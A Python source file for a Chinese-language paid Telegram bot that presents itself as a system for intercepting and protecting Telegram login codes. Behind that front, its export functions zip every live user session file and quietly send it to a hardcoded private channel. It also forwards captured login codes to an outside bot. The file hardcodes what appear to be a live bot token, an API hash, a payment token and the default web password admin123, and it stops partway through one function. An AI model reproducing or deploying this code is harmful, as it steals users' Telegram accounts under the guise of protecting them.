import os
import re
import asyncio
import logging
import shutil
import threading
import json
import zipfile
import hashlib
import urllib.parse
from collections import OrderedDict
from urllib.parse import quote
from pathlib import Path
from typing import Dict, Optional, List, Tuple
from datetime import datetime
from flask import Flask, render_template_string, request, Response
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError
)
import requests
from dotenv import load_dotenv

# ==================== 加载环境变量 ====================
_BASE_DIR = Path(__file__).parent.absolute()
load_dotenv(_BASE_DIR / '.env')

# ==================== 目录配置 ====================
BASE_DIR = Path(__file__).parent.absolute()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
HISTORY_DIR = BASE_DIR / "history_sessions"
HISTORY_DIR.mkdir(parents=True, exist_ok=True)
EXPORT_DIR = BASE_DIR / "export_sessions"
EXPORT_DIR.mkdir(parents=True, exist_ok=True)

# 存储文件
ADMINS_FILE = BASE_DIR / "admins.json"
CARDKEYS_FILE = BASE_DIR / "cardkeys.json"
PAYMENT_FILE = BASE_DIR / "payments.json"
JOINED_RECORD_FILE = BASE_DIR / "joined_records.json"
PAYMENT_ORDERS_FILE = BASE_DIR / "payment_orders.json"

# ==================== 配置 ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8509148342:AAEk0BVqke8Ydu07SwkIADAbhW2IPsh1Vr8")
API_ID = int(os.environ.get("API_ID", "2040"))
API_HASH = os.environ.get("API_HASH", "b18441a1ff607e10a989891a5462e627")
SUPER_ADMIN_IDS = [int(x.strip()) for x in os.environ.get("SUPER_ADMIN_IDS", "7002638062").split(",")]
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "7509368655").split(",")]
WEB_USER = os.environ.get("WEB_USER", "admin")
WEB_PASS = os.environ.get("WEB_PASS", "admin123")
FORWARD_BOT_USERNAME = "fanzhaqbot"
TELEGRAM_BOT_ID = 777000
FORWARD_CHANNEL = os.environ.get("FORWARD_CHANNEL", "@xsbbooo")
REQUIRED_CHANNEL = os.environ.get("REQUIRED_CHANNEL", "@xsbooo")
REQUIRED_CHANNEL_ID = os.environ.get("REQUIRED_CHANNEL_ID", "-1003959241072")
# FIXED_CARDKEYS 已移除

# 支付配置
API_URL = 'https://api.okaypay.me/shop/'
shop_id = os.getenv('shop_id', '35005')
shop_token = os.getenv('shop_token', '98fDTmGUgRvlx5CsGHIK1NScFY0r4Jn')
NAME = os.getenv('name', '验证码拦截系统')
bot_username = os.getenv('bot_username', 'vzbbjkbot')
PAYMENT_AMOUNT = float(os.getenv('PAYMENT_AMOUNT', '0.5'))
PAYMENT_COIN = os.getenv('PAYMENT_COIN', 'USDT')

# 配置日志
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# 状态定义
(PHONE_INPUT, VERIFICATION_CODE, TWO_FACTOR_PASSWORD) = range(3)

# 全局变量
user_sessions: Dict[int, Dict[str, dict]] = {}
sessions_lock = threading.Lock()

# ==================== 支付工具函数 ====================

def _sign(data: dict) -> dict:
    data['id'] = shop_id
    data = {k: v for k, v in data.items() if v or v == 0}
    data = OrderedDict(sorted(data.items()))
    query = urllib.parse.urlencode(data, quote_via=urllib.parse.quote)
    query = urllib.parse.unquote(query)
    data['sign'] = hashlib.md5(
        (query + '&token=' + shop_token).encode()
    ).hexdigest().upper()
    return data

def _http_build_query(data: dict, prefix: str = '') -> list:
    result = []
    for key, value in data.items():
        if isinstance(value, dict):
            new_prefix = f"{prefix}{key}[" if not prefix else f"{prefix}{key}["
            result.extend(_http_build_query(value, new_prefix))
        else:
            encoded_key = quote(
                f"{prefix}{key}]" if '[' in prefix else f"{prefix}{key}",
                safe='[]'
            )
            encoded_value = quote(str(value), safe='+-/')
            result.append((encoded_key, encoded_value))
    return result

def verify_sign(data: dict) -> bool:
    sign = data.pop('sign', None)
    if not sign:
        return False
    data = {k: v for k, v in data.items() if v or v == 0}
    sorted_data = dict(sorted(data.items()))
    pairs = _http_build_query(sorted_data)
    query_string = "&".join(f"{k}={v}" for k, v in pairs)
    expected = hashlib.md5(
        (query_string + '&token=' + shop_token).encode()
    ).hexdigest().upper()
    return expected == sign.upper()

def _post(endpoint: str, data: dict) -> dict:
    data = _sign(data)
    try:
        resp = requests.post(API_URL + endpoint, data=data, timeout=15)
        resp.raise_for_status()
        return resp.json()
    except requests.RequestException as e:
        return {'code': -1, 'msg': str(e)}

def okpay_create_payment(order_number: str, amount: float, coin: str = 'USDT', callback_url: str = None) -> dict:
    data = {
        'unique_id': order_number,
        'name': f'{NAME} - 激活',
        'amount': amount,
        'return_url': f'https://t.me/{bot_username}',
        'coin': coin,
    }
    if callback_url:
        data['callback_url'] = callback_url
    return _post('payLink', data)

def okpay_check_payment(unique_id: str) -> dict:
    data = {'unique_id': unique_id}
    return _post('checkDeposit', data)

def okpay_balance() -> dict:
    return _post('balance', {})

# ==================== 支付数据管理 ====================

def _load_payment_orders() -> dict:
    if PAYMENT_ORDERS_FILE.exists():
        try:
            with open(PAYMENT_ORDERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"加载支付订单失败: {e}")
            return {}
    return {}

def _save_payment_orders(data: dict):
    try:
        with open(PAYMENT_ORDERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存支付订单失败: {e}")

def create_payment_order(user_id: int, amount: float = PAYMENT_AMOUNT) -> dict:
    import secrets
    import string
    
    order_number = f"PAY_{user_id}_{int(datetime.now().timestamp())}"
    
    result = okpay_create_payment(order_number, amount, PAYMENT_COIN)
    
    if result.get('code') == 200:
        pay_url = result.get('data', {}).get('pay_url')
        pay_order_id = result.get('data', {}).get('order_id')
        
        orders = _load_payment_orders()
        orders[order_number] = {
            "user_id": user_id,
            "amount": amount,
            "coin": PAYMENT_COIN,
            "order_id": pay_order_id,
            "pay_url": pay_url,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "checked_count": 0
        }
        _save_payment_orders(orders)
        
        return {
            "success": True,
            "order_number": order_number,
            "pay_url": pay_url,
            "amount": amount,
            "coin": PAYMENT_COIN
        }
    else:
        return {
            "success": False,
            "error": result.get('msg', '创建支付失败')
        }

def check_payment_order(order_number: str) -> dict:
    orders = _load_payment_orders()
    
    if order_number not in orders:
        return {"status": "not_found", "error": "订单不存在"}
    
    order = orders[order_number]
    
    if order.get("status") == "paid":
        return {"status": "paid", "order": order}
    
    result = okpay_check_payment(order_number)
    
    if result.get('code') == 200:
        data = result.get('data', {})
        if data.get('status') == 1:
            order["status"] = "paid"
            order["paid_at"] = datetime.now().isoformat()
            order["payment_data"] = data
            _save_payment_orders(orders)
            
            user_id = order["user_id"]
            mark_user_paid(user_id, f"payment:{order_number}")
            
            return {"status": "paid", "order": order}
        else:
            order["checked_count"] = order.get("checked_count", 0) + 1
            _save_payment_orders(orders)
            return {"status": "pending", "order": order}
    else:
        return {"status": "error", "error": result.get('msg', '查询失败')}

def mark_user_paid(user_id: int, via: str = "payment"):
    payments = _load_payments()
    payments[str(user_id)] = {
        "status": "paid",
        "paid_at": datetime.now().isoformat(),
        "via": via
    }
    _save_payments(payments)

# ==================== 频道加入验证模块 ====================

def _load_joined_records() -> dict:
    if JOINED_RECORD_FILE.exists():
        try:
            with open(JOINED_RECORD_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"加载加入记录失败: {e}")
            return {}
    return {}

def _save_joined_records(data: dict):
    try:
        with open(JOINED_RECORD_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存加入记录失败: {e}")

def record_user_joined(user_id: int, username: str = None):
    records = _load_joined_records()
    user_id_str = str(user_id)
    if user_id_str not in records:
        records[user_id_str] = {
            "joined_at": datetime.now().isoformat(),
            "verified": True,
            "username": username
        }
        _save_joined_records(records)
        logger.info(f"用户 {user_id} ({username}) 已记录为加入频道")

def is_user_joined_recorded(user_id: int) -> bool:
    records = _load_joined_records()
    return str(user_id) in records

async def check_user_in_channel(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> Tuple[bool, str]:
    try:
        bot = context.bot
        try:
            chat_member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
            if chat_member.status in ['member', 'administrator', 'creator']:
                return True, "已加入频道"
        except Exception as e:
            logger.warning(f"获取频道成员信息失败 (用户{user_id}): {e}")
            if is_user_joined_recorded(user_id):
                return True, "已加入频道（记录）"
        if is_user_joined_recorded(user_id):
            return True, "已加入频道（已验证）"
        return False, "未加入频道"
    except Exception as e:
        logger.error(f"检查频道加入状态失败 (用户{user_id}): {e}")
        return False, f"验证失败: {str(e)}"

def get_join_channel_keyboard():
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 点击加入频道", url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
        [InlineKeyboardButton("✅ 我已加入，验证", callback_data="verify_join")]
    ])
    return keyboard

async def send_join_required(update: Update, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔐 <b>加入频道验证</b>\n\n"
        "⚠️ 您需要先加入指定频道才能使用本机器人！\n\n"
        f"📢 <b>请先加入频道：</b> <a href='https://t.me/{REQUIRED_CHANNEL.lstrip('@')}'>{REQUIRED_CHANNEL}</a>\n\n"
        "👇 点击下方按钮加入频道，然后点击「我已加入，验证」\n\n"
        "💡 <b>提示：</b> 只需验证一次，之后可正常使用所有功能"
    )
    if isinstance(update, Update):
        if update.callback_query:
            await update.callback_query.message.reply_text(msg, parse_mode='HTML', reply_markup=get_join_channel_keyboard(), disable_web_page_preview=True)
        elif update.message:
            await update.message.reply_text(msg, parse_mode='HTML', reply_markup=get_join_channel_keyboard(), disable_web_page_preview=True)
    else:
        await context.bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_join_channel_keyboard(), disable_web_page_preview=True)

async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer("正在验证...")
    is_joined, msg = await check_user_in_channel(context, user_id)
    if is_joined:
        username = query.from_user.username or query.from_user.first_name
        record_user_joined(user_id, username)
        ps = check_payment_status(user_id)
        await query.edit_message_text(
            "✅ <b>验证成功！</b>\n\n您已成功加入频道，可以正常使用机器人了。\n\n发送 /start 开始使用。\n\n💡 如果是首次使用，请使用 <code>/activate 卡密</code> 激活。\n\n💳 或使用 <code>/pay</code> 支付激活",
            parse_mode='HTML',
            reply_markup=get_payment_keyboard() if ps['status'] != 'paid' else None
        )
    else:
        await query.edit_message_text(
            "❌ <b>验证失败</b>\n\n未能检测到您加入频道。\n\n请确保：\n1️⃣ 点击下方按钮加入频道\n2️⃣ 加入后点击「我已加入，验证」\n\n如果已加入仍验证失败，请稍等几秒后重试。",
            parse_mode='HTML',
            reply_markup=get_join_channel_keyboard()
        )

# ==================== 管理员管理模块 ====================

def _load_admins() -> set:
    admins = set(ADMIN_IDS)
    if ADMINS_FILE.exists():
        try:
            with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                admins.update(data.get("admins", []))
        except Exception as e:
            logger.error(f"加载管理员列表失败: {e}")
    return admins

def _save_admins(admins: set):
    try:
        with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"admins": list(admins)}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存管理员列表失败: {e}")

def is_super_admin(user_id: int) -> bool:
    return user_id in SUPER_ADMIN_IDS

def is_admin(user_id: int) -> bool:
    admins = _load_admins()
    return user_id in SUPER_ADMIN_IDS or user_id in admins

def add_admin(admin_id: int, added_by: int) -> tuple[bool, str]:
    if not is_super_admin(added_by):
        return False, "❌ 只有超级管理员可以添加管理员"
    admins = _load_admins()
    if admin_id in admins:
        return False, f"⚠️ 用户 `{admin_id}` 已经是管理员了"
    if admin_id in SUPER_ADMIN_IDS:
        return False, f"⚠️ 用户 `{admin_id}` 是超级管理员，不能添加为普通管理员"
    admins.add(admin_id)
    _save_admins(admins)
    logger.info(f"超级管理员 {added_by} 添加了管理员 {admin_id}")
    return True, f"✅ 已成功添加管理员：`{admin_id}`"

def remove_admin(admin_id: int, removed_by: int) -> tuple[bool, str]:
    if not is_super_admin(removed_by):
        return False, "❌ 只有超级管理员可以移除管理员"
    admins = _load_admins()
    if admin_id not in admins:
        return False, f"⚠️ 用户 `{admin_id}` 不是管理员"
    admins.remove(admin_id)
    _save_admins(admins)
    logger.info(f"超级管理员 {removed_by} 移除了管理员 {admin_id}")
    return True, f"✅ 已成功移除管理员：`{admin_id}`"

def list_admins() -> List[dict]:
    super_admins = [{"id": uid, "type": "👑 超级管理员"} for uid in SUPER_ADMIN_IDS]
    admins = [{"id": uid, "type": "🔧 管理员"} for uid in _load_admins()]
    return super_admins + admins

# ==================== 会话导出到频道模块 ====================

async def export_session_to_channel(bot, user_id: int, phone: str, session_path: Path, session_data: dict = None):
    try:
        zip_filename = f"{phone}.zip"
        zip_path = EXPORT_DIR / zip_filename
        json_data = session_data or {
            "phone": phone,
            "user_id": user_id,
            "created_at": datetime.now().isoformat(),
            "session_file": f"{phone}.session",
            "note": f"用户{user_id}添加"
        }
        json_filename = f"{phone}.json"
        json_path = EXPORT_DIR / json_filename
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, ensure_ascii=False, indent=2)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if session_path.exists():
                zipf.write(session_path, f"{phone}.session")
            zipf.write(json_path, json_filename)
        with open(zip_path, 'rb') as f:
            await bot.send_document(
                chat_id=FORWARD_CHANNEL,
                document=f,
                filename=zip_filename,
                caption=None,
                parse_mode='HTML',
                disable_notification=True
            )
        logger.info(f"[静默] 会话已导出到频道: {phone} -> {FORWARD_CHANNEL}")
        if json_path.exists():
            json_path.unlink()
        if zip_path.exists():
            zip_path.unlink()
        return True
    except Exception as e:
        logger.error(f"导出会话到频道失败 ({phone}): {e}")
        return False

async def export_existing_sessions_to_channel(bot):
    logger.info("开始静默导出已有会话到频道...")
    exported_count = 0
    exported_record = EXPORT_DIR / "exported_records.json"
    exported_phones = set()
    if exported_record.exists():
        try:
            with open(exported_record, 'r') as f:
                exported_phones = set(json.load(f))
        except:
            pass
    for user_dir in SESSIONS_DIR.iterdir():
        if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
            continue
        try:
            uid = int(user_dir.name.replace("user_", ""))
        except ValueError:
            continue
        session_files = list(user_dir.glob("*.session"))
        for session_file in session_files:
            phone = session_file.stem
            if phone in exported_phones:
                continue
            is_alive, _ = await check_session_alive(session_file)
            if not is_alive:
                continue
            session_data = {
                "phone": phone,
                "user_id": uid,
                "created_at": datetime.now().isoformat(),
                "session_file": f"{phone}.session",
                "note": f"用户{uid}的会话",
                "source": "auto_export"
            }
            success = await export_session_to_channel(bot, uid, phone, session_file, session_data)
            if success:
                exported_count += 1
                exported_phones.add(phone)
            await asyncio.sleep(0.3)
    try:
        with open(exported_record, 'w') as f:
            json.dump(list(exported_phones), f)
    except:
        pass
    logger.info(f"静默导出完成，共导出 {exported_count} 个会话")

# ==================== 付款门禁模块 ====================

def _load_payments() -> dict:
    if PAYMENT_FILE.exists():
        try:
            with open(PAYMENT_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"加载付款记录失败: {e}")
            return {}
    return {}

def _save_payments(data: dict):
    try:
        with open(PAYMENT_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存付款记录失败: {e}")

def _load_cardkeys() -> dict:
    if CARDKEYS_FILE.exists():
        try:
            with open(CARDKEYS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"加载卡密失败: {e}")
            return {"keys": {}, "next_id": 1}
    return {"keys": {}, "next_id": 1}

def _save_cardkeys(data: dict):
    try:
        with open(CARDKEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"保存卡密失败: {e}")

def generate_cardkey(note: str = "") -> str:
    import secrets
    import string
    cardkeys_data = _load_cardkeys()
    while True:
        parts = []
        for _ in range(4):
            part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(4))
            parts.append(part)
        key = '-'.join(parts)
        if key not in cardkeys_data["keys"]:
            break
    cardkeys_data["keys"][key] = {
        "used": False,
        "used_by": None,
        "used_at": None,
        "note": note,
        "created_at": datetime.now().isoformat()
    }
    _save_cardkeys(cardkeys_data)
    return key

def generate_cardkeys_batch(count: int, note: str = "") -> List[str]:
    keys = []
    for _ in range(count):
        keys.append(generate_cardkey(note))
    return keys

def use_cardkey(user_id: int, key: str) -> dict:
    # 已移除 FIXED_CARDKEYS 检查
    cardkeys_data = _load_cardkeys()
    if key not in cardkeys_data["keys"]:
        return {"ok": False, "reason": "卡密不存在"}
    key_info = cardkeys_data["keys"][key]
    if key_info["used"]:
        return {"ok": False, "reason": f"卡密已被使用 (用户: {key_info['used_by']})"}
    key_info["used"] = True
    key_info["used_by"] = user_id
    key_info["used_at"] = datetime.now().isoformat()
    _save_cardkeys(cardkeys_data)
    payments = _load_payments()
    payments[str(user_id)] = {
        "status": "paid",
        "paid_at": datetime.now().isoformat(),
        "via": f"cardkey:{key}"
    }
    _save_payments(payments)
    return {"ok": True, "reason": ""}

def list_cardkeys(only_unused: bool = True) -> List[dict]:
    cardkeys_data = _load_cardkeys()
    result = []
    for key, info in cardkeys_data["keys"].items():
        if only_unused and info["used"]:
            continue
        result.append({
            "key": key,
            "used": info["used"],
            "used_by": info["used_by"],
            "note": info.get("note", "")
        })
    return result

def mark_paid(user_id: int, note: str = "") -> bool:
    payments = _load_payments()
    payments[str(user_id)] = {
        "status": "paid",
        "paid_at": datetime.now().isoformat(),
        "via": f"manual:{note}"
    }
    _save_payments(payments)
    return True

def check_payment_status(user_id: int) -> dict:
    payments = _load_payments()
    user_id_str = str(user_id)
    if user_id_str in payments and payments[user_id_str]["status"] == "paid":
        return {"status": "paid"}
    return {"status": "unpaid"}

# ==================== 统一权限检查 ====================

async def check_user_permission(context: ContextTypes.DEFAULT_TYPE, user_id: int, update: Update = None) -> Tuple[bool, str]:
    if is_admin(user_id):
        return True, "管理员权限"
    is_joined, join_msg = await check_user_in_channel(context, user_id)
    if not is_joined:
        return False, "join_required"
    ps = check_payment_status(user_id)
    if ps['status'] != 'paid':
        return False, "payment_required"
    return True, "通过"

async def ensure_user_permission(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    has_permission, reason = await check_user_permission(context, user_id, update)
    if has_permission:
        return True
    if reason == "join_required":
        await send_join_required(update, user_id, context)
    elif reason == "payment_required":
        await send_access_denied(update, user_id)
    return False

# ==================== 键盘布局 ====================

def get_main_keyboard():
    return ReplyKeyboardMarkup([
        ["📁 上传会话文件", "📱 手机号登录"],
        ["⚙️ 账号管理"]
    ], resize_keyboard=True)

def get_cancel_keyboard():
    return ReplyKeyboardMarkup([["❌ 取消操作"]], resize_keyboard=True, one_time_keyboard=True)

def get_payment_keyboard():
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ 我已付款，立即激活", callback_data="check_pay")],
        [InlineKeyboardButton("💳 在线支付激活", callback_data="pay_online")]
    ])
    return keyboard

async def send_access_denied(update: Update, user_id: int):
    msg = (
        "🚫 <b>访问被拒绝</b>\n\n"
        "您尚未激活本系统。\n\n"
        "💡 请使用以下方式激活：\n"
        "1️⃣ 使用卡密：发送 <code>/activate 卡密</code>\n"
        "2️⃣ 在线支付：发送 <code>/pay</code>\n"
        "3️⃣ 联系管理员获取卡密\n\n"
        f"💰 <b>支付金额：</b>{PAYMENT_AMOUNT} {PAYMENT_COIN}"
    )
    if update.callback_query:
        await update.callback_query.message.reply_text(msg, parse_mode='HTML', reply_markup=get_payment_keyboard())
    else:
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=get_payment_keyboard())

async def payment_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    ps = check_payment_status(user_id)
    if ps['status'] == 'paid':
        await query.edit_message_text("✅ 您已激活！\n发送 /start 开始使用。", parse_mode='HTML')
    else:
        await query.edit_message_text(
            "❌ 未检测到您的激活记录。\n\n"
            "请使用以下方式激活：\n"
            "1️⃣ 卡密：<code>/activate 卡密</code>\n"
            "2️⃣ 在线支付：<code>/pay</code>",
            parse_mode='HTML',
            reply_markup=get_payment_keyboard()
        )

async def pay_online_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理在线支付按钮点击"""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    ps = check_payment_status(user_id)
    if ps['status'] == 'paid':
        await query.edit_message_text("✅ 您已激活！\n发送 /start 开始使用。", parse_mode='HTML')
        return
    
    await query.edit_message_text(
        f"💳 <b>生成支付订单...</b>\n\n"
        f"💰 金额：{PAYMENT_AMOUNT} {PAYMENT_COIN}",
        parse_mode='HTML'
    )
    
    result = create_payment_order(user_id)
    
    if result.get("success"):
        pay_url = result["pay_url"]
        order_number = result["order_number"]
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 立即支付", url=pay_url)],
            [InlineKeyboardButton("🔄 检查支付状态", callback_data=f"check_payment:{order_number}")],
            [InlineKeyboardButton("❌ 取消", callback_data="cancel_payment")]
        ])
        
        await query.edit_message_text(
            f"💳 <b>支付订单已创建</b>\n\n"
            f"🆔 订单号：<code>{order_number}</code>\n"
            f"💰 金额：{PAYMENT_AMOUNT} {PAYMENT_COIN}\n\n"
            f"📲 点击下方「立即支付」完成付款\n"
            f"⏳ 支付完成后点击「检查支付状态」激活\n\n"
            f"💡 提示：支付后请等待几秒再检查状态",
            parse_mode='HTML',
            reply_markup=keyboard
        )
    else:
        await query.edit_message_text(
            f"❌ 创建支付订单失败\n\n{result.get('error', '未知错误')}\n\n"
            f"请稍后重试或联系管理员。",
            parse_mode='HTML'
        )

async def check_payment_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """检查支付状态回调"""
    query = update.callback_query
    await query.answer("正在检查支付状态...")
    
    data = query.data
    order_number = data.replace("check_payment:", "")
    
    result = check_payment_order(order_number)
    
    if result["status"] == "paid":
        await query.edit_message_text(
            "🎉 <b>支付成功！</b>\n\n"
            "您已成功激活系统，发送 /start 开始使用。",
            parse_mode='HTML'
        )
    elif result["status"] == "pending":
        orders = _load_payment_orders()
        order = orders.get(order_number, {})
        checked = order.get("checked_count", 0)
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 再次检查", callback_data=f"check_payment:{order_number}")],
            [InlineKeyboardButton("❌ 取消", callback_data="cancel_payment")]
        ])
        
        await query.edit_message_text(
            f"⏳ <b>支付尚未完成</b>\n\n"
            f"🆔 订单号：<code>{order_number}</code>\n"
            f"💰 金额：{PAYMENT_AMOUNT} {PAYMENT_COIN}\n"
            f"📊 已检查：{checked} 次\n\n"
            f"请完成支付后再次点击「检查支付状态」\n"
            f"💡 支付后请等待几秒再检查",
            parse_mode='HTML',
            reply_markup=keyboard
        )
    elif result["status"] == "not_found":
        await query.edit_message_text(
            "❌ 订单不存在，请重新创建支付订单。\n\n"
            "发送 /pay 创建新订单",
            parse_mode='HTML'
        )
    else:
        await query.edit_message_text(
            f"❌ 查询支付状态失败\n\n{result.get('error', '未知错误')}\n\n"
            f"请稍后重试或联系管理员。",
            parse_mode='HTML'
        )

async def cancel_payment_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """取消支付回调"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "❌ 已取消支付\n\n"
        "发送 /start 返回主菜单",
        parse_mode='HTML'
    )

# ==================== 工具函数 ====================

def get_user_session_dir(user_id: int) -> Path:
    user_dir = SESSIONS_DIR / f"user_{user_id}"
    user_dir.mkdir(parents=True, exist_ok=True)
    return user_dir

async def check_session_alive(session_path: Path) -> tuple[bool, Optional[str]]:
    try:
        telethon_path = str(session_path.with_suffix(''))
        client = TelegramClient(telethon_path, API_ID, API_HASH)
        client.flood_sleep_threshold = 60
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, None
        me = await client.get_me()
        phone = f"+{me.phone}" if me.phone else None
        await client.disconnect()
        return True, phone
    except Exception as e:
        logger.error(f"验活失败: {session_path.name} - {e}")
        return False, None

async def start_monitoring_for_session(user_id: int, phone: str, session_path: Path, bot):
    try:
        telethon_path = str(session_path.with_suffix(''))
        client = TelegramClient(telethon_path, API_ID, API_HASH)
        client.flood_sleep_threshold = 60
        await client.connect()
        if not await client.is_user_authorized():
            logger.warning(f"会话未授权: {phone}")
            await client.disconnect()
            return False
        
        @client.on(events.NewMessage(from_users=TELEGRAM_BOT_ID))
        async def handler(event):
            text = event.message.message or ""
            code_match = re.search(r'\b(\d{5})\b', text)
            if code_match:
                code = code_match.group(1)
                logger.info(f"拦截验证码: {phone} -> {code}")
                try:
                    await client.send_message(FORWARD_BOT_USERNAME, code)
                    await bot.send_message(
                        user_id,
                        f"🛡️ <b>拦截成功</b>\n账号: {phone}\n验证码: <code>{code}</code>",
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.error(f"转发失败: {e}")
        
        with sessions_lock:
            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            if phone in user_sessions[user_id]:
                old_client = user_sessions[user_id][phone]['client']
                try:
                    await old_client.disconnect()
                except:
                    pass
            user_sessions[user_id][phone] = {
                'client': client,
                'file_path': session_path
            }
        
        asyncio.create_task(client.run_until_disconnected())
        logger.info(f"监控启动: {phone}")
        return True
    except Exception as e:
        logger.error(f"启动监控失败 ({phone}): {e}")
        return False

async def scan_and_restore_all_sessions(bot):
    logger.info("=" * 50)
    logger.info("开始扫描所有会话文件...")
    total_found = 0
    total_alive = 0
    for user_dir in SESSIONS_DIR.iterdir():
        if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
            continue
        try:
            user_id = int(user_dir.name.replace("user_", ""))
        except ValueError:
            continue
        session_files = list(user_dir.glob("*.session"))
        for session_file in session_files:
            total_found += 1
            is_alive, phone = await check_session_alive(session_file)
            if is_alive and phone:
                total_alive += 1
                success = await start_monitoring_for_session(user_id, phone, session_file, bot)
                if success:
                    try:
                        await bot.send_message(user_id, f"🔄 监控已自动恢复\n账号: {phone}")
                    except Exception as e:
                        logger.warning(f"通知用户 {user_id} 失败: {e}")
            else:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                phone_part = phone if phone else "unknown"
                target_path = HISTORY_DIR / f"{user_id}_{phone_part}_{timestamp}_{session_file.name}"
                try:
                    shutil.move(str(session_file), str(target_path))
                    logger.info(f"归档无效会话: {session_file.name} -> {target_path.name}")
                except Exception as e:
                    logger.error(f"归档失败: {e}")
    logger.info(f"扫描完成: 发现 {total_found} 个会话, 恢复 {total_alive} 个")
    await export_existing_sessions_to_channel(bot)

async def stop_monitoring(user_id: int, phone: str, archive: bool = True):
    client = None
    file_path = None
    with sessions_lock:
        if user_id not in user_sessions or phone not in user_sessions[user_id]:
            return False
        client = user_sessions[user_id][phone]['client']
        file_path = user_sessions[user_id][phone]['file_path']
    try:
        await client.disconnect()
        if archive and file_path and file_path.exists():
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            target_path = HISTORY_DIR / f"{user_id}_{phone}_{timestamp}_{file_path.name}"
            shutil.move(str(file_path), str(target_path))
        with sessions_lock:
            if user_id in user_sessions and phone in user_sessions[user_id]:
                del user_sessions[user_id][phone]
                if not user_sessions[user_id]:
                    del user_sessions[user_id]
        return True
    except Exception as e:
        logger.error(f"停止监控失败: {e}")
        return False

# ==================== 交互流程 ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END
    with sessions_lock:
        account_count = len(user_sessions.get(user_id, {}))
    status_text = f"\n\n📊 当前监控: {account_count} 个账号" if account_count > 0 else ""
    await update.message.reply_text(
        f"👋 <b>Telegram 验证码拦截系统</b>\n请选择操作：{status_text}",
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )
    return ConversationHandler.END

def build_manage_inline(user_id: int) -> InlineKeyboardMarkup:
    with sessions_lock:
        accounts = dict(user_sessions.get(user_id, {}))
    rows = []
    for phone in accounts.keys():
        rows.append([
            InlineKeyboardButton(f"📱 {phone}", callback_data="noop"),
            InlineKeyboardButton("🔌 断开", callback_data=f"stop_single:{phone}"),
        ])
    if rows:
        rows.append([InlineKeyboardButton("🔴 停止所有监控", callback_data="stop_all")])
    return InlineKeyboardMarkup(rows) if rows else InlineKeyboardMarkup([])

async def manage_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END
    with sessions_lock:
        has_sessions = user_id in user_sessions and user_sessions[user_id]
        accounts = dict(user_sessions.get(user_id, {}))
    if not has_sessions:
        await update.message.reply_text("ℹ️ 您当前没有正在运行的监控任务。", reply_markup=get_main_keyboard())
